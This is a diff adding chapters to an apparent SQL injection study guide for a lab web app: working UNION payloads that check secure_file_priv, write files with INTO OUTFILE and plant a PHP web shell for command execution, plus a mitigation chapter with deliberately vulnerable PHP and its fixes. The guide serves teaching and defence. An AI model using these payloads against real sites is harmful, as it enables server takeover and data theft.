@@ -33,7 +33,11 @@
 - MySQL Fingerprinting / INFORMATION_SCHEMA / SCHEMATA / TABLES / COLUMNS / Data
 ### 📂 Chapter 13: Reading Files
 - Privileges / DB User / User Privileges / LOAD_FILE
-### 📋 Chapter 14: Command Reference
+### 📝 Chapter 14: Writing Files
+- Write File Privileges / secure_file_priv / INTO OUTFILE / Web Shell
+### 🛡️ Chapter 15: Mitigating SQL Injection
+- Input Sanitization / Input Validation / User Privileges / WAF / Parameterized Queries
+### 📋 Chapter 16: Command Reference
 
 ---
 
@@ -3117,6 +3121,588 @@ Full PHP source — the query is built by concatenating `$_GET["port_code"]` str
 ---
 
 <details>
+<summary><h2>📝 Writing Files</h2></summary>
+
+Writing files is far more restricted than reading — it lets us drop a **web shell** on the server and gain code execution, so modern DBMSes disable it by default and gate it behind privileges. Confirm we have the rights before trying.
+
+<details>
+<summary><h3>Write File Privileges</h3></summary>
+
+Writing files through MySQL needs **three** things:
+
+- User with the **`FILE`** privilege (already confirmed)
+- MySQL global **`secure_file_priv`** not restricting us
+- **Write access** to the target location on the back-end server
+
+<details>
+<summary><h4>secure_file_priv</h4></summary>
+
+`secure_file_priv` controls **where** files can be read/written:
+
+| Value | Meaning |
+|---|---|
+| *(empty)* | Read/write **anywhere** on the file system |
+| `/some/dir` | Restricted to that directory only |
+| `NULL` | Read/write **nowhere** |
+
+Defaults differ: **MariaDB** → empty (any path, with `FILE`); **MySQL** → `/var/lib/mysql-files` (so injection file-write usually fails); some hardened setups → `NULL`.
+
+Locally the value is read with:
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
+
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+
+</td></tr>
+</table>
+
+Through UNION we cannot use `SHOW`, so pull it from `information_schema.global_variables` (columns `variable_name`, `variable_value`), filtered with `WHERE`:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+```
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name='secure_file_priv'-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| secure_file_priv | *(empty)* | 4 |
+
+</td></tr>
+</table>
+
+Value is **empty** → we can read/write files to any location.
+
+</details>
+
+</details>
+
+<details>
+<summary><h3>SELECT INTO OUTFILE</h3></summary>
+
+`SELECT ... INTO OUTFILE` writes query results to a file — normally used to export table data. Append `INTO OUTFILE '...'` to a query. Export the `users` table:
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
+
+```sql
+SELECT * FROM users INTO OUTFILE '/tmp/credentials';
+```
+
+</td></tr>
+</table>
+
+Reading the file on the back-end shows the table content:
+
+<table width="100%">
+<tr><td colspan="2"> 💻 <b>Shell</b> </td></tr>
+<tr><td width="20%">
+
+**`$`**
+
+</td><td>
+
+```bash
+cat /tmp/credentials
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+1       admin   392037dbba51f692776d6cefb6dd546d
+2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
+```
+
+</td></tr>
+</table>
+
+We can also write **arbitrary strings** — the basis for writing our own files:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL</b> </td></tr>
+<tr><td>
+
+```sql
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+```
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> 💻 <b>Shell</b> </td></tr>
+<tr><td width="20%">
+
+**`$`**
+
+</td><td>
+
+```bash
+cat /tmp/test.txt
+ls -la /tmp/test.txt
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+this is a test
+-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
+```
+
+</td></tr>
+</table>
+
+The file is created, owned by the `mysql` user.
+
+> **TIP:** For long or binary files, wrap the payload in `FROM_BASE64("base64_data")` to write advanced content.
+
+</details>
+
+<details>
+<summary><h3>Writing Files through SQL Injection</h3></summary>
+
+Test write access to the webroot with a proof file. The query writes `file written successfully!` to `/var/www/html/proof.txt`:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL</b> </td></tr>
+<tr><td>
+
+```sql
+SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt'
+```
+
+</td></tr>
+</table>
+
+> **NOTE:** Writing a web shell needs the **web root**. Find it by reading the server config with `LOAD_FILE` — Apache `/etc/apache2/apache2.conf`, Nginx `/etc/nginx/nginx.conf`, IIS `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config` — or fuzz common webroots with a wordlist, or read the path from server error messages.
+
+UNION injection payload:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+```
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+|  |  |  |
+
+*(empty table, no error → query succeeded)*
+
+</td></tr>
+</table>
+
+Browse the file to confirm:
+
+<table width="100%">
+<tr><td> 🌐 <b>Browser</b> </td></tr>
+<tr><td>
+
+`GET /proof.txt`
+
+```
+1       file written successfully!      3       4
+```
+
+</td></tr>
+</table>
+
+> **NOTE:** The `1`, `3`, `4` around the string are the other UNION columns written to the file. For cleaner output, use `""` (empty strings) as junk instead of numbers.
+
+</details>
+
+<details>
+<summary><h3>Writing a Web Shell</h3></summary>
+
+With write access confirmed, drop a PHP web shell into the webroot:
+
+<table width="100%">
+<tr><td> 🐘 <b>PHP — Web shell</b> </td></tr>
+<tr><td>
+
+```php
+<?php system($_REQUEST[0]); ?>
+```
+
+</td></tr>
+</table>
+
+Reuse the OUTFILE payload — swap the string for the shell, `""` for junk, and the filename to `shell.php`:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+```
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+|  |  |  |
+
+*(empty table, no error → shell written)*
+
+</td></tr>
+</table>
+
+Execute commands via the `0` parameter — `?0=id`:
+
+<table width="100%">
+<tr><td> 🌐 <b>Browser</b> </td></tr>
+<tr><td>
+
+`GET /shell.php?0=id`
+
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+</td></tr>
+</table>
+
+Code execution confirmed — commands run as the **`www-data`** user. From here: upgrade to a reverse shell and enumerate for privilege escalation.
+
+</details>
+
+</details>
+
+---
+
+<details>
+<summary><h2>🛡️ Mitigating SQL Injection</h2></summary>
+
+Knowing how SQLi works, we can defend against it. No single control is a silver bullet — layer them. Examples below are PHP, but the logic carries to every language and library.
+
+<details>
+<summary><h3>Input Sanitization</h3></summary>
+
+The vulnerable auth code passes POST input straight into the query:
+
+<table width="100%">
+<tr><td> 🐘 <b>PHP — Vulnerable</b> </td></tr>
+<tr><td>
+
+```php
+<SNIP>
+  $username = $_POST['username'];
+  $password = $_POST['password'];
+
+  $query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
+  echo "Executing query: " . $query . "<br /><br />";
+
+  if (!mysqli_query($conn ,$query))
+  {
+          die('Error: ' . mysqli_error($conn));
+  }
+<SNIP>
+```
+
+</td></tr>
+</table>
+
+Sanitizing input neutralizes injected queries. `mysqli_real_escape_string()` escapes characters like `'` and `"` so they lose their special meaning:
+
+<table width="100%">
+<tr><td> 🐘 <b>PHP — Sanitized</b> </td></tr>
+<tr><td>
+
+```php
+<SNIP>
+$username = mysqli_real_escape_string($conn, $_POST['username']);
+$password = mysqli_real_escape_string($conn, $_POST['password']);
+
+$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
+echo "Executing query: " . $query . "<br /><br />";
+<SNIP>
+```
+
+</td></tr>
+</table>
+
+The injection no longer works — the quotes are escaped:
+
+<table width="100%">
+<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
+<tr><td>
+
+Executing query:
+
+```sql
+SELECT * FROM logins WHERE username='admin\' or \'1\'=\'1' AND password = '';
+```
+
+🔴 **Login failed!**
+
+</td></tr>
+</table>
+
+> **NOTE:** `pg_escape_string()` does the same for PostgreSQL queries.
+
+</details>
+
+<details>
+<summary><h3>Input Validation</h3></summary>
+
+Input can also be validated against the expected shape — an email must look like `...@email.com`, a port code is only letters and spaces. The vulnerable ports code:
+
+<table width="100%">
+<tr><td> 🐘 <b>PHP — Vulnerable</b> </td></tr>
+<tr><td>
+
+```php
+<?php
+if (isset($_GET["port_code"])) {
+    $q = "Select * from ports where port_code ilike '%" . $_GET["port_code"] . "%'";
+    $result = pg_query($conn,$q);
+
+    if (!$result)
+    {
+        die("</table></div><p style='font-size: 15px;'>" . pg_last_error($conn). "</p>");
+    }
+<SNIP>
+?>
+```
+
+</td></tr>
+</table>
+
+Restrict `port_code` to letters and spaces with a regex allowlist via `preg_match()`:
+
+<table width="100%">
+<tr><td> 🐘 <b>PHP — Validated</b> </td></tr>
+<tr><td>
+
+```php
+<SNIP>
+$pattern = "/^[A-Za-z\s]+$/";
+$code = $_GET["port_code"];
+
+if(!preg_match($pattern, $code)) {
+  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
+}
+
+$q = "Select * from ports where port_code ilike '%" . $code . "%'";
+<SNIP>
+```
+
+</td></tr>
+</table>
+
+The pattern `[A-Za-z\s]+` matches only letters and spaces; anything else kills the script. Normal input passes:
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=c`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| ... | ... | ... |
+
+</td></tr>
+</table>
+
+An injection attempt is rejected:
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code='; SELECT 1,2,3,4-- -`
+
+⚠️ **Invalid input! Please try again.**
+
+</td></tr>
+</table>
+
+</details>
+
+<details>
+<summary><h3>User Privileges</h3></summary>
+
+Run the app's DB queries as a **least-privilege** user — never a superuser or admin, whose extra functions can lead to server compromise. Create a user with only the access the app needs:
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MariaDB</b> </td></tr>
+<tr><td width="20%">
+
+**`MariaDB>`**
+
+</td><td>
+
+```sql
+CREATE USER 'reader'@'localhost';
+GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+Query OK, 0 rows affected (0.002 sec)
+Query OK, 0 rows affected (0.000 sec)
+```
+
+</td></tr>
+</table>
+
+`reader` gets only `SELECT` on the `ports` table. Logging in confirms the restriction — it sees only `ports`, and is denied `credentials`:
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MariaDB</b> </td></tr>
+<tr><td width="20%">
+
+**`$`**
+
+</td><td>
+
+```bash
+mysql -u reader -p
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```sql
+MariaDB [(none)]> use ilfreight;
+MariaDB [ilfreight]> SHOW TABLES;
++---------------------+
+| Tables_in_ilfreight |
++---------------------+
+| ports               |
++---------------------+
+1 row in set (0.000 sec)
+
+MariaDB [ilfreight]> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
++--------------------+
+| SCHEMA_NAME        |
++--------------------+
+| information_schema |
+| ilfreight          |
++--------------------+
+2 rows in set (0.000 sec)
+
+MariaDB [ilfreight]> SELECT * FROM ilfreight.credentials;
+ERROR 1142 (42000): SELECT command denied to user 'reader'@'localhost' for table 'credentials'
+```
+
+</td></tr>
+</table>
+
+Even if injection succeeds, the blast radius is capped at the `ports` table.
+
+</details>
+
+<details>
+<summary><h3>Web Application Firewall</h3></summary>
+
+A **WAF** inspects HTTP requests and rejects malicious input, blocking SQLi even when the app logic is flawed. Options range from open-source (**ModSecurity**) to premium (**Cloudflare**), most shipping default rules for common web attacks — e.g. any request containing `INFORMATION_SCHEMA` (a hallmark of SQLi enumeration) is dropped.
+
+> **NOTE:** A WAF is a safety net, not a fix — combine it with sanitization, validation, and parameterized queries.
+
+</details>
+
+<details>
+<summary><h3>Parameterized Queries</h3></summary>
+
+The strongest fix: **parameterized queries** (prepared statements). Data goes into placeholders (`?`), and the driver escapes and binds it — never concatenated into the SQL string:
+
+<table width="100%">
+<tr><td> 🐘 <b>PHP — Parameterized</b> </td></tr>
+<tr><td>
+
+```php
+<SNIP>
+  $username = $_POST['username'];
+  $password = $_POST['password'];
+
+  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
+  $stmt = mysqli_prepare($conn, $query);
+  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
+  mysqli_stmt_execute($stmt);
+  $result = mysqli_stmt_get_result($stmt);
+
+  $row = mysqli_fetch_array($result);
+  mysqli_stmt_close($stmt);
+<SNIP>
+```
+
+</td></tr>
+</table>
+
+Two `?` placeholders hold the username and password; `mysqli_stmt_bind_param()` binds them (`'ss'` = two strings), safely escaping quotes. Injected input is treated as **data**, never as SQL.
+
+</details>
+
+<details>
+<summary><h4>Conclusion</h4></summary>
+
+This list is not exhaustive — application logic can still open holes. The examples are PHP, but the same principles (sanitize, validate, least privilege, WAF, parameterize) apply across all common languages and libraries.
+
+</details>
+
+</details>
+
+---
+
+<details>
 <summary><h2>📋 Command Reference</h2></summary>
 
 Quick reference of the statements covered so far — this table will grow as more commands are added.
@@ -3170,7 +3756,17 @@ Quick reference of the statements covered so far — this table will grow as mor
 | `SELECT super_priv FROM mysql.user` | Check superuser privilege (`Y`/`N`) |
 | `... FROM information_schema.user_privileges` | Dump user privileges (`grantee`, `privilege_type`) |
 | `LOAD_FILE('/path')` | Read a file's contents (needs `FILE` privilege) |
+| `SHOW VARIABLES LIKE 'secure_file_priv';` | Show where file read/write is allowed (empty = anywhere) |
+| `... FROM information_schema.global_variables WHERE variable_name="secure_file_priv"` | Read `secure_file_priv` via UNION |
+| `SELECT ... INTO OUTFILE '/path'` | Write query output to a file (needs `FILE` + empty `secure_file_priv` + write access) |
+| `SELECT '<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/html/shell.php'` | Drop a PHP web shell → RCE (`?0=<cmd>`) |
+| `FROM_BASE64("data")` | Decode base64 in an `OUTFILE` write — long/binary files |
 | `SHOW GRANTS;` | View the current user's privileges |
+| `mysqli_real_escape_string($conn, $in)` | 🛡️ Mitigation — escape `'`/`"` in user input (sanitization) |
+| `preg_match('/^[A-Za-z\s]+$/', $in)` | 🛡️ Mitigation — allowlist input validation |
+| `CREATE USER 'u'@'host' IDENTIFIED BY '...';` | 🛡️ Mitigation — create a restricted DB user |
+| `GRANT SELECT ON db.table TO 'u'@'host';` | 🛡️ Mitigation — grant least privilege |
+| `mysqli_prepare()` + `mysqli_stmt_bind_param()` | 🛡️ Mitigation — parameterized query (strongest fix) |
 
 </details>
 
